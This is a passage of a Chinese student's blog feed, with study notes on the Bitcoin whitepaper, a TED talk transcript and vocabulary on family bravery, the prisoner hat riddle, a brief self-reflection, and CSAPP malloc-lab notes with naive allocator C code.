Value</h2><blockquote><p>where a transaction depends on several transactions, and those transactions depend on many more, is not a problem here. There is never the need to extract a complete standalone copy of a transaction’s history.</p></blockquote><p>为什么不需要展开之前的交易历史呢，不展开之前的怎么知道我现在够不够钱进行下一次交易呢？</p><h2 id="10-Privacy"><a href="#10-Privacy" class="headerlink" title="10.Privacy"></a>10.Privacy</h2><p>Traditional Privacy Model and New Privacy Model</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202407112309745.png" alt="image-20240711224903616"></p><p>只要保持自己的公钥是匿名的，那么就像股市交易一样，公众只知道交易信息，不知道交易双方</p><blockquote><p>a new key pair should be used for each transaction to keep them from being linked to a common owner.</p></blockquote><p>可以每次交易用不同的马甲，但存在并行输入multi-input，所以可能被发现</p><h2 id="11-Calculations"><a href="#11-Calculations" class="headerlink" title="11.Calculations"></a><strong>11.Calculations</strong></h2><blockquote><p>We consider the scenario of an attacker trying to generate an alternate chain faster than the honest chain. Even if this is accomplished, it does not throw the system open to arbitrary changes, such as creating value out of thin air or taking money that never belonged to the attacker. Nodes are not going to accept an invalid transaction as payment, and honest nodes will never accept a block containing them. An attacker can only try to change one of his own transactions to take back money he recently spent.</p></blockquote><p>Attacker破坏链条后能做的破坏也是有限的。</p><p><a href="https://happypeter.github.io/binfo/calculations">解读计算过程</a></p><p>本小节主要通过数学公式说明了攻击者的成功可能性非常低。</p><h2 id="12-Conclusion"><a href="#12-Conclusion" class="headerlink" title="12. Conclusion"></a>12. Conclusion</h2><blockquote><p>Any needed rules and incentives can be enforced with this consensus mechanism.</p></blockquote><p>一种美妙的机制！</p>]]></content>
      
      
      <categories>
          
          <category> BLOCKCHAIN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>To love is to be brave</title>
      <link href="/2024/06/29/TED_4/"/>
      <url>/2024/06/29/TED_4/</url>
      
        <content type="html"><![CDATA[<h1 id="To-love-is-to-be-brave"><a href="#To-love-is-to-be-brave" class="headerlink" title="To love is to be brave"></a>To love is to be brave</h1><blockquote><p>有一说一，听了这么久，断断续续的听，还是听不来，太痛苦了，1550词的原稿，这不是纯纯阶级+n！</p></blockquote><p>Auditor Kelly Corrigan</p><blockquote><p><a href="https://www.ted.com/talks/kelly_corrigan_to_love_is_to_be_brave">MP3</a></p><p><a href="https://www.bilibili.com/video/BV1WM4m127qZ/">双语字幕</a></p></blockquote><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Family life often requires extraordinary bravery,from <strong>navigating</strong> the daily challenges to surviving the unexpected <strong>crises</strong>(crisis-&gt;crises). </p><p><strong>profound</strong> wisdom and seven key words to help you focus in on what matters most!</p><p>TED is not a virus!</p><p>I was drawn to the world brave.</p><p>I had a soft spot for ripping yarns  </p><p>So odyssey on the brain,</p><p>without knowing how to spell <strong>starboard</strong>(右舷) or which side it referred to</p><p>Malta Tunisia Sicily</p><p>It was like a little booklet of <strong>perforated</strong>(Something have many holes or a hole on it )</p><p>some <strong>expired</strong>(It can no longer be legally used) <strong>antibiotics</strong>(a drug that is used to kill bacteria and cure infections) </p><p><strong>nanny</strong>(A woman whose job is to take care of the children)</p><p>flight <strong>attendant</strong>(Someone’s job is to help customers )</p><p>I <strong>smeared</strong>(spread a liquid or soft substance on the surface ) sunblock on their noses and <strong>Vegemite</strong>(A type of soft ,dark-brown salty food) on their <strong>toast</strong>(bread that has been heated)</p><p>The heavy lifting was left for the truly brave</p><p>feel a <strong>modicum</strong>( a small amount of something, especially a good quality) of safety in a <strong>patently</strong>(very clearly)unsafe world.</p><p><strong>cremation</strong>(to burn the body in a funeral ceremony)</p><p>catalogue</p><p><strong>dementia</strong> (a liness that made you lose the braverty and courage)</p><p><strong>choke</strong>(unable to breath) up</p><p><strong>diapers</strong></p><p>calibrate the exquisite bravery</p><p>Bravery is the great guts to move closer to the wound</p><p>you just pick up a weapon with your ripped pecs and ropey veins and start slaying  </p><p><strong>posture</strong></p><p><strong>afflicted</strong>(to affect someone in a difficult way,make them suffer)</p><p><strong>gritty</strong>(show the determination and courage) <strong>endurance</strong>(the ablity to continue to do something ) types </p><p>The Two Things brave don’t do:</p><p>1. </p><ol start="2"><li>hide ,leave inside work or hobbies</li></ol><p>burpy and farty(打嗝和放屁)</p><p><strong>humiliating</strong>(make embrassment and ashamed) history</p><h2 id="Article"><a href="#Article" class="headerlink" title="Article"></a>Article</h2><p>This is for my mom, even though when I called her to say, “Hey, have you heard of TED, T-E-D?” She said, “Oh my God, Kelly, it’s not another virus, is it?”</p><p>(Laughter)</p><p>As a 21-year-old, I was drawn to the word brave. I had a soft spot for ripping yarns and the people who could tell them. So, Odyssey on the brain, I went out adventure collecting.</p><p>Without knowing how to spell starboard or which side it referred to, I got on a 46-foot boat and I sailed from Malta to Tunisia to Sicily. I traveled 11,000 miles over 13 months to seven different countries without a plan or a phone or a credit card. Just 3,800 dollars in traveler’s checks, which, if you’re under 30, it was like a little booklet of –</p><p>(Laughter)</p><p>perforated, I don’t know.</p><p>(Laughter)</p><p>And some expired antibiotics my mom made me bring.</p><p>(Laughter)</p><p>And then, running out of money, I landed as a nanny for two kids, four and seven, who had just lost their mom. I moved into their house, so I could cover things on the three days a week their dad worked as a flight attendant for Qantas. I smeared sunblock on their noses and Vegemite on their toast. I read them to sleep at night, I cleaned the counters.</p><p>The heavy lifting was left for the truly brave, a man who organized his emotions and answered the hardest questions, such that his kids and hers could feel a modicum of safety in a patently unsafe world. </p><p>Questions like “what is cremation?” And “what happens to us if you die?” And so it is that I stood witness to the unphotographable, unmeasurable bravery of some guy named Jim in Sydney, Australia. And over the years since, I find I just can’t stop cataloging these Olympic achievements in family life.</p><p>The really big things often come with a game plan and a team of experts and enough adrenaline to lift a school bus over your head. But inside every crisis you think you might be ready for are 100 dirty surprises that are not in the playbook. I had stage-3 cancer in my 30s, and I can tell you that following the chemo schedule didn’t take nearly as much courage as admitting to my husband that sex felt less sexy after my boobs, which were once a real strong suit for me –</p><p>(Laughter)</p><p>Were made weird and uneven by a surgeon’s knife. Here’s a surprise. My friend’s father, in his final days, addled by dementia, chased her around the second floor with a fork he hid in his pajamas. They tell you there will be loss. They don’t tell you you will be required to love your dad even as he’s coming for you with silverware.</p><p>(Laughter)</p><p>I’ve interviewed 228 people for my PBS show and my podcast, people with huge careers, Grammys and Pulitzers and NBA championships. And I listened to their stories and I’m duly impressed.</p><p>But I’ll tell you the ones they know the best. The ones they can’t tell without choking up. The moment when Bryan Stevenson’s grandmother, or Steve Kerr’s father, or Samantha Power’s stepfather, or Cecile Richards’ mom, was right there with the right words or the right silence at the right moment.This bravery I’m talking about might even be better understood if you look at the smaller moments of injury in family life when there’s not really an answer, or it might be your fault, or it might remind you of something you’d rather forget. Or because people are so suggestible and the wrong tone or expression or phrasing might somehow make things worse. Say your kid was dropped from a group text. </p><p>They were in it, they mattered, they belonged, and then, poof. Or your husband blew the big deal at work, or your mom won’t wear the diapers that would really help her get through mahjong on Wednesdays.</p><p>(Laughter)</p><p>And how should we calibrate the exquisite bravery to respond productively when someone in our family looks at us and says, “Do I know you?” “I weigh myself before and after every meal,” “I hear voices,” “I steal,” “I’m using again,” “He raped me,” “She says I raped her,” “I cut myself,” “I bought a gun,” “I stopped taking the medication,” “I can’t stop making online bets.” “Sometimes I wonder if more life is really worth all this effort.” Bravery is the great guts to move closer to the wound, as composed as a war nurse holding eye contact and saying these seven words: </p><p>Tell me more. What else? Go on. </p><p>That’s how the brave shine, that’s all they do. </p><p>They say, “Tell me more. What else? Go on.” </p><p>Even if they’re scared of what might happen next, even if they have no training or experience to prepare them for this moment. Even if it’s late and they have an early flight. Here’s two things the brave don’t do. They don’t take over and become the hero </p><p>like it’s a battle and the moves are so obvious. You just pick up a weapon with your ripped pecs and ropey veins and start slaying. In families, bravery is mostly just sitting there. With a posture that communicates “I can hear anything you want to tell me.” And a nice warm face of love that says, “This is so hard, </p><p>but you will figure it out.”</p><p>Personally, I thought love meant action. I had no idea it could be so still.  When things get hairy for one of my people, everything in me wants to grab a clipboard, make a to-do list, and start calendaring appointments. Because where there’s love, there’s attachment. And I don’t care what the gurus say, what’s happening to them is also happening, at least at some level, to us. And all that can accidentally put us center stage. No longer the coach or the minister,  but rather one of the afflicted. But these gritty endurance types I’ve been admiring have no self and no needs and no agenda. Or at least they know how to override all that for the main character who is not us.</p><p>The second thing the brave don’t do? Leave. Or hide inside work or hobbies or some other socially acceptable busyness. In my worst moments, when sitting on my hands is just unbearable, I have dreamed of going to get an MFA in Paris.</p><p>(Laughter)</p><p>Because if I can’t help, why do I have to watch? It would be nice to leave and start again. Hardly anyone who’s been in a long marriage hasn’t at least wondered how it is that the object of their desire has become so burpy and farty.</p><p>(Laughter)</p><p>So bingo-armed and turkey-necked. Sometimes I see myself naked. Stretch marks from pregnancies, scars from cancer surgeries, other things that I don’t feel you need to be visualizing right about now.</p><p>(Laughter)</p><p>And I think it’s a miracle that man stays with me. But, you know, he’s not untouched by time either.</p><p>(Laughter)</p><p>And that’s just the physical. I mean, who here hasn’t wanted to be with someone </p><p>who hasn’t seen us eating on the toilet or bitching at the Comcast guy?</p><p>(Laughter)</p><p>Leaving behind our own humiliating history, maybe with the nice person we met at art school in Paris.</p><p>(Laughter)</p><p>It’s an option. People take it. The brave hang around. They are available and ready to bear witness.</p><p>The final act of bravery was made clear for me during a conversation with my friend Liz while she was dying at 46. She said she had this weird, long, totally convincing dream where all the parents who, as she put it, had to leave early, were gathered. And there she was, one of thousands of moms and dads, and they were on folding chairs, looking down at the world below through a thick glass floor. And in this imaginary space her subconscious created, there was one rule. You could watch your child’s life unfold, but you could only intervene once. In Liz’s dream, a perfect dream, she never had to intervene. She had given them enough while she was here.</p><p>The final act then of the truly brave is leaning back and letting them go. The reward for all this bravery? Not gold medals, not hero shots for Strava, not ringing the bell at the New York Stock Exchange, or owning the dinner party with Burning Man stories, I think you know who you are.</p><p>(Laughter)</p><p>Maybe not even thanks. The reward is a full human experience, complete with all the emotions at maximum dosage, where we have been put to great use and found an other-centric love that is complete in its expression and its transmission. The reward is to end up soft and humble, empty and in awe, knowing that of all the magnificence we have beheld from cradle to grave, the most eye-popping was interpersonal.</p><p>So here’s to anyone who notices and reads between the lines, who asks the right questions, but not too many, who takes notes at the doctor’s office and wipes butts, young and old, who listens, holds and stays. We, who, untrained and always a little off-guard, still dare to do love. </p><p>To be love. </p><p>That’s brave.</p><p>Thank you.</p><p>(Cheers and applause)</p>]]></content>
      
      
      <categories>
          
          <category> TED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> TED </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solve the prisoner hat riddle?</title>
      <link href="/2024/06/25/TED_3/"/>
      <url>/2024/06/25/TED_3/</url>
      
        <content type="html"><![CDATA[<h1 id="Can-you-solve-the-prisoner-hat-riddle？"><a href="#Can-you-solve-the-prisoner-hat-riddle？" class="headerlink" title="Can you solve the prisoner hat riddle？"></a>Can you solve the prisoner hat riddle？</h1><blockquote><p><a href="https://www.ted.com/talks/alex_gendler_can_you_solve_the_prisoner_hat_riddle">MP3</a></p></blockquote><h2 id="Key"><a href="#Key" class="headerlink" title="Key"></a>Key</h2><ol><li><p>ten people facing forward in size order </p></li><li><p>each of you have a white&#x2F;black hat on you heads,you should guess your hat color,you can only see the hat color of the people who are front of you.</p></li><li><p>odd or even , the first can use the black&#x2F;white to show odd &#x2F;even,if prisoner one see odd numbers black ,he say black,and if prisoner two see odd numbers black,he should say black ,because he can guess his hat is white ,the same can be said.</p></li><li><p>Recursion!</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202406290401115.png" alt="image-20240629040149871"></p><h2 id="Article"><a href="#Article" class="headerlink" title="Article"></a>Article</h2><p>You and nine other individuals have been captured by super intelligent alien overlords. The aliens think humans look quite tasty, but their civilization forbids eating highly logical and cooperative beings. Unfortunately, they’re not sure whether you qualify, so they decide to give you all a test. Through its universal translator, the alien guarding you tells you the following: You will be placed in a single-file line facing forward in size order so that each of you can see everyone lined up ahead of you. You will not be able to look behind you or step out of line. Each of you will have either a black or a white hat on your head assigned randomly, and I won’t tell you how many of each color there are. When I say to begin, each of you must guess the color of your hat starting with the person in the back and moving up the line. And don’t even try saying words other than black or white or signaling some other way, like intonation or volume; you’ll all be eaten immediately. If at least nine of you guess correctly, you’ll all be spared. You have five minutes to discuss and come up with a plan, and then I’ll line you up, assign your hats, and we’ll begin. Can you think of a strategy guaranteed to save everyone? Pause the video now to figure it out for yourself. </p><p>（Answer in: 3  2  1）</p><p>The key is that the person at the back of the line who can see everyone else’s hats can use the words “black” or “white” to communicate some coded information. So what meaning can be assigned to those words that will allow everyone else to deduce their hat colors? It can’t be the total number of black or white hats. There are more than two possible values, but what does have two possible values is that number’s parity, that is whether it’s odd or even. So the solution is to agree that whoever goes first will, for example, say “black” if he sees an odd number of black hats and “white” if he sees an even number of black hats. Let’s see how it would play out if the hats were distributed like this. The tallest captive sees three black hats in front of him, so he says “black,” telling everyone else he sees an odd number of black hats. He gets his own hat color wrong, but that’s okay since you’re collectively allowed to have one wrong answer. Prisoner two also sees an odd number of black hats, so she knows hers is white, and answers correctly. Prisoner three sees an even number of black hats, so he knows that his must be one of the black hats the first two prisoners saw. Prisoner four hears that and knows that she should be looking for an even number of black hats since one was behind her. But she only sees one, so she <strong>deduces</strong>(to use the knowledge and information in order to understand something ) that her hat is also black. Prisoners five through nine are each looking for an odd number of black hats, which they see, so they figure out that their hats are white. Now it all comes down to you at the front of the line. If the ninth prisoner saw an odd number of black hats, that can only mean one thing. You’ll find that this strategy works for any possible arrangement of the hats. The first prisoner has a 50% chance of giving a wrong answer about his own hat, but the parity information he conveys allows everyone else to guess theirs with absolute certainty. Each begins by expecting to see an odd or even number of hats of the specified color. If what they count doesn’t match, that means their own hat is that color. And every time this happens, the next person in line will switch the <strong>parity</strong>(the state of being equal) they expect to see. So that’s it, you’re free to go. It looks like these aliens will have to go hungry, or find some less logical organisms to <strong>abduct</strong>(to take someone away by force ).</p>]]></content>
      
      
      <categories>
          
          <category> TED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> TED </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人之惰性</title>
      <link href="/2024/06/19/relaxation/"/>
      <url>/2024/06/19/relaxation/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我是什么人?</p></blockquote><p><strong>间歇性奋起</strong>，反复性思考，<strong>持续性摆烂</strong>，<strong>周期式后悔</strong>。</p><p>感觉这四个词就可以概括我的一生了。</p>]]></content>
      
      
      <categories>
          
          <category> PASTFUTURE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
            <tag> 镜花水月 </tag>
            
            <tag> 自律 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置CS61B环境</title>
      <link href="/2024/06/02/environment/"/>
      <url>/2024/06/02/environment/</url>
      
        <content type="html"><![CDATA[<p>配置cs61B环境需要以下部件：</p><ul><li>python</li><li>java</li><li>git</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CS61B </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP的lab7-malloclab</title>
      <link href="/2024/05/24/lab7/"/>
      <url>/2024/05/24/lab7/</url>
      
        <content type="html"><![CDATA[<blockquote><p>充满惰性，在一日又一日的刷视频，一日又一日的打游戏中虚度时间，时不时搞一些表面功夫来打发时间，将本该完成的工作一拖再拖，没有plan，也没有Execution ability，永远在编译，动态调整属于自己的ddl时间，这距离也就一天天拉远，反思！</p></blockquote><h1 id="Lab前瞻"><a href="#Lab前瞻" class="headerlink" title="Lab前瞻"></a>Lab前瞻</h1><p>在CSAPP的课本中第九章(虚拟内存）9.9.1开始提及malloc函数和free函数，虚拟内存还不甚了解。<del>我都没怎么看这一章，是直接跳过来的emm</del>，malloc不初始化它返回的内存</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这里同时介绍了<code>sbrk</code>函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">sbrk</span><span class="token punctuation">(</span><span class="token class-name">intptr_t</span> incr<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>sbrk</code> 函数通过将内核的 <code>brk</code> 指针增加<code>incr</code> 来扩展和收缩堆。如果成功，它就返回<code>brk</code> 的旧值，否则，它就返回 <code>-1</code>,并将 <code>errno</code> 设置为 <code>ENOMEM</code> 。如果 <code>incr</code> 为零，那么<code>sbrk</code> 就返回 <code>brk</code> 的当前值。用一个负的<code>incr</code>来调用<code>sbrk</code>是合法的，而且很巧妙，因为返回值 (<code>brk</code> 的旧值）指向距新堆顶向上 <code>abs(incr)</code> 字节处。如果<code>incr</code>是正值就往上涨不然就往下降，幅度是<code>abs(incr)</code>.</p><p>程序通过<code>free</code>函数来时想释放已分配的堆块.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>他不返回任何值且ptr必须指向已分配块的起始位置.不然就是未定义undefined.</p><p>malloc性能衡量指标:</p><ul><li><p>最大化吞吐率</p></li><li><p>最大化利用率</p><p>之所以会出现利用率这个点是因为你不知道什么时候会释放哪一个内存块,有可能总空闲空间足够但是空闲空间因为不合理的分配导致其分离无法被使用,即存在更加合理的分配方式使得内存被分配.</p></li></ul><p>碎片:</p><p>Internal fragmentation:简单量化,其就是已分配块的大小和有效载荷大小之差的和</p><p>External fragmentation:难以被量化,因为其还要考虑未来的请求</p><p>需要解决问题:</p><ul><li><p>空闲块组织free_list</p></li><li><p>放置:</p><ul><li>first fit:在靠近链表起始处留下碎片</li><li>next fit:经过研究发现其比上不足比下也不足,所以一般情况下不用</li><li>best fit:需要耗费较多的时间,因为其要进行彻底的堆搜索,但是能做出更优秀的决策(在当前状态下)</li></ul></li><li><p>分割</p></li><li><p>合并coalescing:即存在多个fragmentation靠在一起,可以合并成为一个大的块</p><ol><li>immediate coalescing</li></ol><p>每次都进行合并相邻块</p><ol start="2"><li>deferred coalescing</li></ol><p> 分配失败的时候再选择合并,扫描整个堆</p></li></ul><p>带边界标记进行合并:(boundary tag)</p><p>预处理:每个块的头部生成一个脚部,脚部为头部的副本,便于下面的子块往上快速的识别上面的块是否空闲.</p><p><strong>看不懂以下部分:空闲块,已分配,</strong></p><blockquote><p>幸运的是，有一种非常聪明的边界标记的优化方法，能够使得在已分配块中不再需要脚部 。回想一下，当我们试图在内存中合并当前块以及前面的块和后面的块时，只有在前面的块是空闲时，才会需要用到它的脚部。如果我们把前面块的已分配／空闲位存放在当前块中多出来的低位中，那么已分配的块就不需要脚部了，这样我们就可以将这个多出来的空间用作有效载荷了。不过请注意，空闲块仍然需要脚部 。</p></blockquote><p>最小块大小可以在不同时刻被分配或者被释放,故最小块大小是max(最小分配块大小,最小空闲块大小)</p><h1 id="Lab预备"><a href="#Lab预备" class="headerlink" title="Lab预备"></a>Lab预备</h1><h2 id="lab前置工作"><a href="#lab前置工作" class="headerlink" title="lab前置工作"></a><strong>lab前置工作</strong></h2><ol><li>对于M芯片的mac，在开始实验前需要修改<code>config.h</code>文件,修改这一行</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">AVG_LIBC_THRUPUT</span>      <span class="token expression"><span class="token number">600E3</span>  </span><span class="token comment">/* 600 Kops/sec */</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将本来的600E3改成128E3,是由于mac上的运行环境和该实验的设定环境不一致，所以要进行一些调控否则实验分数不正常！<strong>注意，这样子修改也只是勉强做做实验，知足！</strong></p><p>可以以三种方式组织malloclab 分别是数组结构，隐式空闲列表，显式空闲列表</p><ol start="2"><li>下载traces文件并且更改makefile的trace文件路径，<a href="https://blog.csdn.net/qq_42241839/article/details/123697377">参考下文</a></li></ol><h2 id="lab结构"><a href="#lab结构" class="headerlink" title="lab结构"></a>lab结构</h2><ol><li><p>数组结构：最低效，最直接emm</p></li><li><p>隐式空闲链表（Implicit Free List）：把所有的块连接起来，而且是通过头部中的大小字段隐含地连接着的，每次都需要遍历所有块来找到合适的空闲块。</p></li></ol><p>我们将基于隐式空闲链表，使用立即边界标记合并方式，从头至尾地讲述一个简单分配器的实现。最大的块大小为2^32^ &#x3D;4GB。代码是 64 位干净的，即代码能不加修改地运行在 32 位 (gcc -m32) 或 64 位 (gcc -m64) 的进程中。</p><p><img src="https://raw.githubusercontent.com/zhzvite/picgoroom/img/img/202406110118910.png"><br>一个块包含了头部，有效载荷，空闲块，和脚部（可能会有)，块大小即为整个块的大小，脚部是头部的副本，和头部一样，头部中分为块大小和填充位两个信息，</p><ol start="3"><li>显式空闲链表（Explicit Free Lists）：在空闲块中增加两个指针，分别指向链表中前一块和后一块，这样就不需要遍历所有块，只需要遍历空闲块。</li></ol><h2 id="Lab解法"><a href="#Lab解法" class="headerlink" title="Lab解法"></a>Lab解法</h2><h3 id="1-数组结构"><a href="#1-数组结构" class="headerlink" title="1.数组结构"></a>1.数组结构</h3><p>以数组结构组织malloc，只用malloc 和 realloc函数，只需要开辟新空间，对于realloc，也只需要开辟新空间，简要判断size大小。</p><p>即不需要free空间，只需要使用malloc开辟新空间即可，对于内存调整大小，则直接开辟新空间然后复制数据即可，不用考虑新老空间大小的关系</p><p><strong>注意header存的size值表示的是包括header（footer），有效载荷，填充区块的总和，而ptr指向的是有效载荷的起始位置。</strong></p><p>数组结构代码：</p><p>这个代码是<code>mm.c</code>文件中给定的,仅作为加深对malloc的理解，明白工作流程而已。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* * mm-naive.c - The fastest, least memory-efficient malloc package. *  * In this naive approach, a block is allocated by simply incrementing * the brk pointer.  A block is pure payload. There are no headers or * footers.  Blocks are never coalesced or reused. Realloc is * implemented directly using mm_malloc and mm_free. * * NOTE TO STUDENTS: Replace this header comment with your own header * comment that gives a high level description of your solution. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"mm.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"memlib.h"</span></span><span class="token comment">/********************************************************* * NOTE TO STUDENTS: Before you do anything else, please * provide your team information in the following struct. ********************************************************/</span><span class="token class-name">team_t</span> team <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* Team name */</span>    <span class="token string">"Vite Fuck"</span><span class="token punctuation">,</span>    <span class="token comment">/* First member's full name */</span>    <span class="token string">"zhz_vite"</span><span class="token punctuation">,</span>    <span class="token comment">/* First member's email address */</span>    <span class="token string">"2811215248@qq.com"</span><span class="token punctuation">,</span>    <span class="token comment">/* Second member's full name (leave blank if none) */</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token comment">/* Second member's email address (leave blank if none) */</span>    <span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/* single word (4) or double word (8) alignment */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ALIGNMENT</span> <span class="token expression"><span class="token number">8</span></span></span><span class="token comment">/* rounds up to the nearest multiple of ALIGNMENT */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">ALIGN</span><span class="token expression"><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ALIGNMENT<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x7</span><span class="token punctuation">)</span></span><span class="token comment">//会得到大于等于size的最小整数</span></span><span class="token comment">//(size) + (ALIGNMENT-1)会得到最接近但不大于其alignment的倍数</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIZE_T_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token function">ALIGN</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/*  * mm_init - initialize the malloc package. */</span><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token comment">//数组结构不用初始化</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*  * mm_malloc - Allocate a block by incrementing the brk pointer. *     Always allocate a block whose size is a multiple of the alignment. */</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> newsize <span class="token operator">=</span> <span class="token function">ALIGN</span><span class="token punctuation">(</span>size <span class="token operator">+</span> SIZE_T_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//首先将size进行字节对齐</span>    <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span>newsize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//开辟新空间</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>p <span class="token operator">=</span> size<span class="token punctuation">;</span><span class="token comment">//填入数值</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p <span class="token operator">+</span> SIZE_T_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/* * mm_free - Freeing a block does nothing. */</span><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">&#125;</span><span class="token comment">/* * mm_realloc - Implemented simply in terms of mm_malloc and mm_free */</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">void</span> <span class="token operator">*</span>oldptr <span class="token operator">=</span> ptr<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>newptr<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> copySize<span class="token punctuation">;</span><span class="token comment">// 使用 mm_malloc(size) 分配新的内存区域</span>newptr <span class="token operator">=</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>newptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">// 从原始指针 oldptr 中获取复制的大小</span>copySize <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>oldptr <span class="token operator">-</span> SIZE_T_SIZE<span class="token punctuation">)</span><span class="token 